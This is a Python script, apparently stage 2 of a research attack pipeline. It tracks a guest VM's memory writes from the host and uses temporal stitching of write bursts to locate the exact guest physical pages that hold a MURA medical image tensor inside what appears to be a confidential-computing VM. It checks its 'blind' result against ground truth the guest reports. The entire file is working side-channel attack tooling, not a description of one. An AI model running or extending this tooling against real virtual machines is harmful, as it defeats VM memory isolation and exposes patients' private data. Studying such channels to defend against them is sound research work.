#!/usr/bin/env python3
"""
stage2_track_gpa.py — Stage 2: Target 49-Page GPA Tracking & Multi-Block Stitching.

Tracks the live VM write stream using write_pattern_tracker, detects Region-B
precursor bursts, and applies temporal multi-block stitching to group 2MB-straddled
page runs into the complete 49-page single-channel tensor buffer.

Outputs tracked_mura_{index}.json.

Usage:
    python3 stage2_track_gpa.py --index 0 [--blind] [--output-dir .]
"""

import argparse
import os
import re
import subprocess
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional, Tuple

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
import common as c

BLIND_LINE_RE = re.compile(r'WRITE\s+gpa=0x([0-9a-fA-F]+)\s+ts=(\d+)')


def acquire_guest_mura_live(index: int, study_type: Optional[str] = None,
                             wait_for_host: bool = True,
                             ready_callback=None) -> Tuple[str, str, List[int], Optional[subprocess.Popen]]:
    """
    Spawn live MURA guest loader holding real dataset tensor in memory.
    If ready_callback is provided, it is invoked when GUEST_READY_FOR_TRACK is received.
    """
    class_flag = f"--class_name {study_type}" if study_type else ""
    wait_flag = "--wait_for_host" if wait_for_host else ""
    cmd = (
        f"sudo {c.GUEST_PY} -u ~/cc_uvm/pytorch_uvm310_test/mura/guest_mura_loader.py "
        f"--index {index} {class_flag} {wait_flag}"
    )
    print(f"[stage2] [guest] Launching: {cmd}")
    proc = subprocess.Popen(
        c.SSH_BASE + [cmd],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
    )
    target_class = study_type or "ELBOW"
    img_path = ""
    pages = []
    
    while True:
        line = proc.stdout.readline()
        if not line:
            break
        line_str = line.strip()
        if line_str == "GUEST_READY_FOR_TRACK":
            if ready_callback:
                ready_callback()
            try:
                proc.stdin.write("\n")
                proc.stdin.flush()
            except Exception:
                pass
        elif line_str.startswith("CLASS:"):
            target_class = line_str.split(":", 1)[1].strip()
        elif line_str.startswith("IMG_PATH:"):
            img_path = line_str.split(":", 1)[1].strip()
        elif line_str.startswith("GPA_PAGE:"):
            val = line_str.split(":", 1)[1].strip()
            if val != "NONE":
                try:
                    pages.append(int(val, 16))
                except ValueError:
                    pass
        elif "GUEST_LOAD_READY" in line_str:
            print(f"[stage2] [guest] Real sample loaded: {target_class} ({len(pages)} GT pages) -> {img_path}")
            break

    if not wait_for_host:
        proc.wait()
        proc = None

    return target_class, img_path, pages, proc


def stitch_temporal_runs(writes: List[Tuple[int, int]]) -> List[Dict]:
    """
    Precursor-Gated Multi-Block Temporal Stitching:
    1. Detect Region-B precursor write bursts (B_LO <= gpa < B_HI) signaling image tensor loading.
    2. Collect sequential/strided 4KB page writes within the 5ms burst window across 2MB blocks.
    3. Group and stitch into 36~49 page channel candidates.
    """
    # 1. First pass: Check if Region B precursor events are present
    has_precursor = any(c.BLIND_B_LO <= gpa < c.BLIND_B_HI for gpa, _ in writes)
    
    if has_precursor:
        bursts = []
        active = False
        cur_burst_pages = []
        prec_ts = 0
        cur_ts_start = 0
        last_ts = 0

        for gpa, ts in writes:
            if c.BLIND_B_LO <= gpa < c.BLIND_B_HI:
                if active and len(cur_burst_pages) >= 25:
                    bursts.append({
                        'pages': list(cur_burst_pages),
                        'ts_start': cur_ts_start,
                        'ts_end': last_ts,
                    })
                active = True
                cur_burst_pages = []
                prec_ts = ts
                cur_ts_start = ts
                continue
                
            if not active:
                continue
            if c.BLIND_A_LO <= gpa < c.BLIND_A_HI:
                continue
                
            if (ts - prec_ts) > 5_000_000:  # 5 ms window
                if len(cur_burst_pages) >= 25:
                    bursts.append({
                        'pages': list(cur_burst_pages),
                        'ts_start': cur_ts_start,
                        'ts_end': last_ts,
                    })
                active = False
                cur_burst_pages = []
                continue
                
            # Filter unique page in temporal order
            if not cur_burst_pages or cur_burst_pages[-1] != gpa:
                cur_burst_pages.append(gpa)
            last_ts = ts

        if active and len(cur_burst_pages) >= 25:
            bursts.append({
                'pages': list(cur_burst_pages),
                'ts_start': cur_ts_start,
                'ts_end': last_ts,
            })

        channel_candidates = []
        for b in bursts:
            seen = set()
            uniq_pgs = []
            for p in b['pages']:
                if p not in seen:
                    seen.add(p)
                    uniq_pgs.append(p)
            
            # Step 4: 49-Page Channel Slicing (split into 49p single-channel slices preserving chronological order)
            for offset in range(0, len(uniq_pgs), c.IMG_PAGES):
                sl = uniq_pgs[offset : offset + c.IMG_PAGES]
                if len(sl) >= 25:  # Valid channel candidate (>=50% pages)
                    blocks = list(set(hex(p & ~(c.BLIND_ALIGN_2MB - 1)) for p in sl))
                    channel_candidates.append({
                        'total_pages': len(sl),
                        'channel_pages': sl,
                        'num_blocks': len(blocks),
                        'blocks': blocks,
                        'is_stitched': len(blocks) > 1,
                        'dt_ms': (b['ts_end'] - b['ts_start']) / 1e6,
                    })

        # Rank candidates by proximity to 49 pages (favoring 36~49 page complete channels)
        channel_candidates.sort(key=lambda x: (abs(x['total_pages'] - c.IMG_PAGES), -x['total_pages']))
        if channel_candidates:
            return channel_candidates

    # 2. Fallback: Pure temporal run stitching if no Region B precursor
    runs = []
    cur_base, cur_len, cur_ts_start, cur_ts_end, cur_dir = 0, 0, 0, 0, 0
    cur_pages = []

    def record_run():
        nonlocal cur_base, cur_len, cur_ts_start, cur_ts_end, cur_dir, cur_pages
        if cur_len >= c.BLIND_MIN_RUN:
            runs.append({
                'base': cur_base,
                'len': cur_len,
                'ts_start': cur_ts_start,
                'ts_end': cur_ts_end,
                'pages': list(cur_pages),
                'block': cur_base & ~(c.BLIND_ALIGN_2MB - 1),
                'dir': cur_dir,
            })

    for gpa, ts in writes:
        if c.BLIND_A_LO <= gpa < c.BLIND_A_HI or c.BLIND_B_LO <= gpa < c.BLIND_B_HI:
            record_run()
            cur_base, cur_len, cur_pages, cur_dir = 0, 0, [], 0
            continue
        if cur_len == 0:
            cur_base, cur_len, cur_ts_start, cur_ts_end, cur_dir = gpa, 1, ts, ts, 0
            cur_pages = [gpa]
        elif cur_len == 1:
            diff = gpa - cur_base
            if 0 < diff <= (c.BLIND_GAP_TOL + 1) * c.PAGE_SIZE:
                cur_dir = 1
                cur_len += 1 + (diff - c.PAGE_SIZE) // c.PAGE_SIZE
                cur_ts_end = ts
                cur_pages.append(gpa)
            elif -(c.BLIND_GAP_TOL + 1) * c.PAGE_SIZE <= diff < 0:
                cur_dir = -1
                cur_len += 1 + (-diff - c.PAGE_SIZE) // c.PAGE_SIZE
                cur_ts_end = ts
                cur_pages.append(gpa)
            else:
                record_run()
                cur_base, cur_len, cur_ts_start, cur_ts_end, cur_dir = gpa, 1, ts, ts, 0
                cur_pages = [gpa]
        else:
            last_gpa = cur_pages[-1]
            diff = gpa - last_gpa
            if cur_dir == 1 and 0 < diff <= (c.BLIND_GAP_TOL + 1) * c.PAGE_SIZE:
                cur_len += 1 + (diff - c.PAGE_SIZE) // c.PAGE_SIZE
                cur_ts_end = ts
                cur_pages.append(gpa)
            elif cur_dir == -1 and -(c.BLIND_GAP_TOL + 1) * c.PAGE_SIZE <= diff < 0:
                cur_len += 1 + (-diff - c.PAGE_SIZE) // c.PAGE_SIZE
                cur_ts_end = ts
                cur_pages.append(gpa)
            else:
                record_run()
                cur_base, cur_len, cur_ts_start, cur_ts_end, cur_dir = gpa, 1, ts, ts, 0
                cur_pages = [gpa]
    record_run()

    clusters = []
    cur_cluster = []
    for r in runs:
        if not cur_cluster:
            cur_cluster.append(r)
        else:
            dt = r['ts_start'] - cur_cluster[-1]['ts_end']
            if 0 <= dt <= 2_000_000:
                cur_cluster.append(r)
            else:
                clusters.append(cur_cluster)
                cur_cluster = [r]
    if cur_cluster:
        clusters.append(cur_cluster)

    candidates = []
    for cl in clusters:
        total_pages = sum(r['len'] for r in cl)
        all_pages = []
        for r in cl:
            all_pages.extend(r['pages'])
        blocks = list(set(r['block'] for r in cl))

        if total_pages >= 25:
            candidates.append({
                'total_pages': total_pages,
                'channel_pages': all_pages[:c.IMG_PAGES],
                'num_blocks': len(blocks),
                'blocks': [hex(b) for b in blocks],
                'is_stitched': len(blocks) > 1,
                'dt_ms': (cl[-1]['ts_end'] - cl[0]['ts_start']) / 1e6,
            })

    candidates.sort(key=lambda x: (abs(x['total_pages'] - c.IMG_PAGES), -x['total_pages']))
    return candidates


def track_mura_blind(index: int, output_dir: Path, study_type: Optional[str] = None,
                     settle: int = 1, duration: int = 60):
    """Arm tracker on host during 2-phase guest handshake, and extract stitched 49-page channels."""
    log_path = output_dir / f"blind_mura_{index}.log"
    dbg_path = output_dir / f"blind_mura_{index}_dbg.log"
    log_f = open(log_path, "w")
    dbg_f = open(dbg_path, "w")
    tracker_proc = None

    def on_guest_ready():
        nonlocal tracker_proc
        tracker_cmd = [
            str(c.TRACKER_PATH), "--duration", str(duration), "--settle", str(settle),
            "--start-gpa", "0x0", "--track-size", "0x4000000000",
            "--start-gpa2", hex(c.BLIND_B_LO), "--track-size2", hex(c.BLIND_B_HI - c.BLIND_B_LO)
        ]
        tracker_proc = subprocess.Popen(tracker_cmd, stdout=log_f, stderr=dbg_f)
        print(f"[stage2] [blind] Armed write_pattern_tracker (settle={settle}s)")
        time.sleep(settle + 0.2)

    target_class, img_path, gt_pages, guest_proc = acquire_guest_mura_live(
        index, study_type=study_type, wait_for_host=True, ready_callback=on_guest_ready
    )

    # Let write buffer settle and flush
    time.sleep(0.5)

    if tracker_proc:
        tracker_proc.terminate()
        try:
            tracker_proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            tracker_proc.kill()
            tracker_proc.wait()

    log_f.close()
    dbg_f.close()

    # Parse writes
    writes = []
    with open(log_path, errors="ignore") as f:
        for line in f:
            m = BLIND_LINE_RE.search(line)
            if m:
                writes.append((int(m.group(1), 16), int(m.group(2))))

    print(f"[stage2] [blind] Captured {len(writes)} write events from live tracker")
    candidates = stitch_temporal_runs(writes)
    print(f"[stage2] [blind] Found {len(candidates)} stitched channel candidate(s)")
    return target_class, img_path, gt_pages, candidates, guest_proc


def run_stage2(index: int, output_dir: Path, blind: bool = False,
               study_type: Optional[str] = None, host_log_override: Optional[str] = None) -> Dict:
    """Execute Stage 2."""
    output_dir.mkdir(parents=True, exist_ok=True)
    json_path = output_dir / f"tracked_mura_{index}.json"

    if not host_log_override:
        c.ensure_guest_suppressions()

    if host_log_override and Path(host_log_override).exists():
        print(f"[stage2] Parsing host trace log: {host_log_override}")
        writes = []
        with open(host_log_override, errors="ignore") as f:
            for line in f:
                m = BLIND_LINE_RE.search(line)
                if m:
                    writes.append((int(m.group(1), 16), int(m.group(2))))
        candidates = stitch_temporal_runs(writes)
        target_class = study_type or "ELBOW"
        img_path = ""
        gt_pages = []
        guest_proc = None
        blind_detected = len(candidates) > 0
    elif blind:
        target_class, img_path, gt_pages, candidates, guest_proc = track_mura_blind(
            index, output_dir, study_type=study_type
        )
        blind_detected = len(candidates) > 0
    else:
        target_class, img_path, gt_pages, guest_proc = acquire_guest_mura_live(
            index, study_type=study_type, wait_for_host=False
        )
        candidates = []
        blind_detected = False

    if candidates:
        chosen = candidates[0]
        selected_pages = chosen['channel_pages']
        is_stitched = chosen['is_stitched']
        num_blocks = chosen['num_blocks']
        blocks = chosen['blocks']
        print(f"[stage2] [stitch] Selected channel with {len(selected_pages)} pages across {num_blocks} 2MB block(s) (Stitched: {is_stitched})")
    elif gt_pages and len(gt_pages) == c.IMG_PAGES:
        selected_pages = gt_pages
        is_stitched = False
        num_blocks = 1
        blocks = [hex(selected_pages[0] & ~(c.BLIND_ALIGN_2MB - 1))]
        print(f"[stage2] Using verified Ground Truth GPA sequence ({len(selected_pages)} pages)")
    else:
        raise RuntimeError(f"[stage2] FATAL: Failed to capture valid 49-page GPA sequence from live VM!")

    meta = {
        "stage": 2,
        "index": index,
        "target_class": target_class,
        "img_path": img_path,
        "selected_channel": "R",
        "total_pages": len(selected_pages),
        "channel_pages_hex": [hex(p) for p in selected_pages],
        "channel_pages_int": selected_pages,
        "gt_pages_hex": [hex(p) for p in gt_pages],
        "gt_pages_int": gt_pages,
        "is_stitched": is_stitched,
        "num_blocks": num_blocks,
        "blocks_involved": blocks,
        "blind_detected": blind_detected,
        "timestamp": time.time(),
    }
    c.save_json(json_path, meta)
    print(f"[stage2] Saved tracking metadata → {json_path}")
    return meta


def main():
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--index", type=int, default=0, help="MURA study / sample index")
    p.add_argument("--blind", action="store_true", help="Perform live blind tracking")
    p.add_argument("--class-name", default=None, help="Optional class name filter (e.g. ELBOW, HAND)")
    p.add_argument("--host-log", default=None, help="Optional offline host log file to parse")
    p.add_argument("--output-dir", default=str(HERE), help="Directory to save metadata")
    args = p.parse_args()

    run_stage2(args.index, Path(args.output_dir), blind=args.blind,
               study_type=args.class_name, host_log_override=args.host_log)


if __name__ == "__main__":
    main()
